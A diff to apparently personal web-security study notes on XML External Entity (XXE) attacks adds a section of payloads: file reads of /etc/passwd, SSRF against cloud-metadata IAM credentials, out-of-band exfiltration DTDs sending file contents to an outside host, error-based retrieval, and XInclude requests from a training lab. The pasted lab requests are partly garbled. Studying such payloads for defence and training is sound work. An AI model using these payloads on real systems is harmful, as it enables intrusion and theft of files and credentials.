@@ -70,11 +70,11 @@
 ]&gt;
 
 &lt;gift&gt;
-	&lt;To&gt;Frnak&lt;/To&gt;
-	&lt;From&gt;&amp;from;&lt;/From&gt;
+	&lt;To&gt;Frank&lt;/To&gt;
+	&lt;From&gt;&amp;gift;&lt;/From&gt;
 	&lt;Item&gt;Cards&lt;/Item&gt;
 &lt;/gift&gt; </code></pre><ul id="c1879d70-c474-4b2d-8f8a-a995c02ea54e" class="bulleted-list"><li style="list-style-type:disc">google XXE Payloads<ul id="f00c5a09-3357-4c5d-9535-77fd19a8116d" class="bulleted-list"><li style="list-style-type:circle">Payloads all the things</li></ul></li></ul><ul id="73daf752-9e6d-4b99-97a3-d26f55128cde" class="bulleted-list"><li style="list-style-type:disc">We can put malicious characters in our entities that are banned in normal use</li></ul><ul id="3b60ec3f-6ffc-4636-8791-1e52da8ffbf4" class="bulleted-list"><li style="list-style-type:disc">File upload features</li></ul><ul id="101d7e97-2966-44c5-86b3-a23744ba4cbd" class="bulleted-list"><li style="list-style-type:disc">Bypassing whitelisted extensions</li></ul><p id="35437130-0aec-44dd-881b-72cbc7f2efe9" class="">
-</p><p id="9f3a7bfa-34ce-4e61-98e2-618a4d7ca1ba" class="">Prevention:</p><h3 id="2fe1cff9-09b3-4024-8372-0380eede6729" class="">Disable XML External Entities</h3><p id="8168c846-bfc1-48ec-b9cf-f1ebd5eed12f" class="">This secure coding practice blocks <strong>XML External Entity attacks</strong></p><p id="1d67df55-e57c-4295-becf-16000bfe420b" class="">Unfortunately Java EE applications have a real problem with disabling XML External Entities. 
+</p><p id="9f3a7bfa-34ce-4e61-98e2-618a4d7ca1ba" class=""><strong>Prevention:</strong></p><h3 id="2fe1cff9-09b3-4024-8372-0380eede6729" class="">Disable XML External Entities</h3><p id="8168c846-bfc1-48ec-b9cf-f1ebd5eed12f" class="">This secure coding practice blocks <strong>XML External Entity attacks</strong></p><p id="1d67df55-e57c-4295-becf-16000bfe420b" class="">Unfortunately Java EE applications have a real problem with disabling XML External Entities. 
 They are turned on by default in the default DocumentBuilder and all other XML related capabilities: schema verification, transformation, etc.</p><p id="7f7dc43e-c582-455c-af70-1dec6308c82d" class="">There is also a multitude of open source parsers which have different configuration settings for turning off entities. 
 These parsers may be required by other open source components.</p><p id="4e57dbe4-eb33-48ff-9138-0dc5c89064eb" class="">Best approach is to disable all known resolving properties as seen below
  . The project should have a single XML DocumentBuilder constructor that
@@ -143,7 +143,115 @@ logical attacks where the application fails to reach the block of
 code that drops privileges and the privileges remain elevated.</p><p id="1922d37b-cfb1-44b3-ae26-cecf01cfc8af" class="">Examples of such incorrect behavior are running processes as root/system
  or giving a user admin roles by default before performing an 
 authorization check.</p><p id="288017a5-0048-444c-9244-b034df5fed58" class="">Execution with Unnecessary Privileges and Incorrect Permission Assignment for Critical Resource <em>add insult to injury</em> when another security flaw exists:</p><ul id="b2c6cf72-979a-4874-a958-9815bd33f939" class="bulleted-list"><li style="list-style-type:disc">Path Traversal and XML External Entity<ul id="b810be87-2f5d-4331-985b-74e096af764c" class="bulleted-list"><li style="list-style-type:circle">read system files:<p id="5313e455-f8a7-4fe2-84a1-1016c3e6b9d7" class="">/etc/shadow</p></li></ul></li></ul><ul id="1d96909f-7255-40bf-83e5-bee36e4bfa8d" class="bulleted-list"><li style="list-style-type:disc">OS Command Injection<ul id="a502989a-7e64-4587-895a-52c8a3ed89b2" class="bulleted-list"><li style="list-style-type:circle">from significant to total access to the system</li></ul></li></ul><p id="7d4cd265-704b-47bf-ac40-b8e581cfe887" class="">Even when software is not running as root if the user is given sudo rights it&#x27;s just the same.</p><p id="fb8a477c-a35c-4427-ad59-a989a7b60b3d" class=""><strong>Note:</strong> The principle of least privilege will not prevent authorization attacks if authorization decisions are not carefully reviewed.
-The principle of least privilege will also not prevent horizontal privilege escalation attacks where a user attacks another.</p></div></article></main></main>
+The principle of least privilege will also not prevent horizontal privilege escalation attacks where a user attacks another.</p><p id="27bb1aac-b825-4027-9e45-c4dd4b9d663d" class="">
+</p><p id="dda8685c-dc34-4660-a9ea-fad33557cd28" class="">
+</p><p id="76478f90-3ec2-40a6-b71c-e6367e7c56f3" class=""><strong>Examples</strong>:</p><p id="892b8677-aa46-4c27-9b17-9b442338d531" class=""><strong>Basic in-band:</strong></p><pre id="c90c1809-a526-40ba-b7f0-ac6bb1d132fe" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;&amp;test;&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="d26c46e7-650f-40bf-80bc-53973254d7e0" class="">
+</p><p id="2fc64b7d-c813-4771-87d8-89b930571bb1" class=""><strong>XXE to SSRF:</strong></p><pre id="8bc05ba6-9d13-4bc4-82cf-95f661ba9bf8" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY test SYSTEM &quot;http://0.0.0.0/latest/meta-data/iam/security-credentials/admin&quot;&gt;
+]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;&amp;test;&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="60a7d33f-a7c8-4a65-916c-cc30c4e34daf" class="">
+</p><p id="21535153-0ebd-4959-9fb0-49a7f407669f" class=""><strong>Blind XXE Out-of-Band:</strong></p><ul id="7649fd01-c8eb-42e8-b281-5b854ae2b84e" class="bulleted-list"><li style="list-style-type:disc">response returns an error instead of reflecting information back.</li></ul><pre id="fab2d9d0-813a-4882-afae-ae277a3f5e85" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY test SYSTEM &quot;http://0.0.0.0/&quot;&gt;
+]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;&amp;test;&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="90117514-9fe5-4364-b0e2-2de3f78f61be" class="">
+</p><p id="6f895617-afed-493e-b9b7-a8db3f082fab" class=""><strong>Parameter Entities:</strong></p><pre id="d10e5c96-fbdf-4404-8a01-10cf7b31abee" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY % test SYSTEM &quot;http://0.0.0.0/&quot;&gt; %test;]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;test&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="e42b547d-5433-4b23-9b0d-ef791fe3ece9" class="">
+</p><p id="cafd1bac-0845-4f9c-bdc4-e8e72a3b768d" class="">Out-Of-Band Data exfiltration:</p><pre id="3e151f52-e748-44db-a0ec-e865e9380b2c" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY % loadDtd SYSTEM &quot;http://0.0.0.0/exploit&quot;&gt; 
+%loadDtd;
+%stack;
+%exfil]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;test&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="40b64fed-a736-4435-9c17-133ecae59124" class="">
+</p><pre id="f904b720-bde2-4e45-ac89-29053b7b6120" class="code"><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;
+&lt;!ENTITY % stack &quot;&lt;!ENTITY % exfil SYSTEM &#x27;http://0.0.0.0/%file;&#x27;&gt;&quot;&gt;
+----------
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;
+&lt;!ENTITY % stack &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://0.0.0.0/%file;&#x27;&gt;&quot;&gt;</code></pre><p id="6d89ad5f-3318-4da6-ae95-15c4ef3e95e8" class="">
+</p><p id="0977bf9e-333c-447f-8201-7a843373f3c7" class=""><strong>Retrieving data via errors:</strong></p><pre id="2ffcb418-e10c-45f3-a703-83b5429397a1" class="code"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+	&lt;!ENTITY % loadDtd SYSTEM &quot;http://0.0.0.0/exploit&quot;&gt; 
+%loadDtd;
+%stack;
+%exfil]&gt;
+
+&lt;gift&gt;
+	&lt;To&gt;test&lt;/To&gt;
+	&lt;From&gt;gift&lt;/From&gt;
+	&lt;Item&gt;Cards&lt;/Item&gt;
+&lt;/gift&gt; </code></pre><p id="42ee60a8-4c4a-461a-96b1-325fcad8d5e7" class="">
+</p><pre id="98583d57-8bb2-4601-810b-723e15f5832d" class="code"><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % stack &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file://idk/%file;&#x27;&gt;&quot;&gt;</code></pre><p id="2e08f93b-1c4a-49f1-900b-9cda82954542" class="">
+</p><p id="d94fd8e1-b8a6-4c3e-a542-ff52f2592d30" class=""><strong>Xinclude:</strong></p><ul id="4b67033c-8aef-47a6-80cc-b2e09c79578b" class="bulleted-list"><li style="list-style-type:disc">if we are given JSON, its worth a try to convert to XML in burp and see if it accepts it.</li></ul><pre id="cfdf0486-edef-422d-af13-e78664eac084" class="code"><code>POST /product/stock HTTP/1.1
+Host:
+ac731f6615667ffc084703400a0004d .web-securit y-academy. net
+Cookie: session=
+(VCO4RvW6 JF6b0P2Lcn8tDMNGWXBOyb iD
+User-Agent: Mozilla/5.0 (X11; Linux ×86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept:
+* /*
+Content - Type:
+application/x-www-form-urlencoded
+Origin:
+I
+https://ac731f6615667ffc084703400a0004d.web
+-security-academy. net
+Content -Length: 128
+Te: trailers
+Connection: close
+productId=%26entity;&amp;storeId=1</code></pre><p id="91ecda1a-795a-4d79-b393-7036bf4c29c9" class="">
+</p><pre id="af8e26f1-57cb-4bc9-94b6-e2c8bfb16e6b" class="code"><code>POST /product/stock HTTP/1.1
+Host:
+ac731f6615667ffc084703400a0004d .web-securit y-academy. net
+Cookie: session=
+(VCO4RvW6 JF6b0P2Lcn8tDMNGWXBOyb iD
+User-Agent: Mozilla/5.0 (X11; Linux ×86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept:
+* /*
+Content - Type:
+application/x-www-form-urlencoded
+Origin:
+I
+https://ac731f6615667ffc084703400a0004d.web
+-security-academy. net
+Content -Length: 128
+Te: trailers
+Connection: close
+productId=&lt;hack xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt; xi:include parse=&quot;text&quot;
+href-&quot;file:///etc/passwd&quot;/&gt;&lt;/hack&gt;&amp;storeId=1</code></pre><p id="8e909027-6da7-4a55-8763-9be3076daafd" class="">
+</p><p id="0e09f417-1027-4ee0-9ed4-542754e08e3a" class=""><strong>Repurposing local Dtds for data exfiltration:</strong></p><ul id="1c2f88b0-a488-40b9-8f44-666f3a53c51e" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/GoSecure/dtd-finder">https://github.com/GoSecure/dtd-finder</a></li></ul><pre id="ff51e87d-ae40-4941-be13-1dedc5f88cd6" class="code"><code></code></pre><p id="d337f9a7-1769-4c0f-b6d2-af1ae1413681" class="">
+</p><p id="fc2b00b7-bff8-415b-8142-84e2344dfa83" class=""><strong>XXE via SVG image:</strong></p><ul id="ce566fce-f6e3-445f-8d65-3f0a86b4f770" class="bulleted-list"><li style="list-style-type:disc">exploit file uploads since svg is just an xml image</li></ul><ul id="73fcff7c-3829-4491-87c4-e7dbcea4b66a" class="bulleted-list"><li style="list-style-type:disc">Replace the requests image xml with your xml then send it</li></ul></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
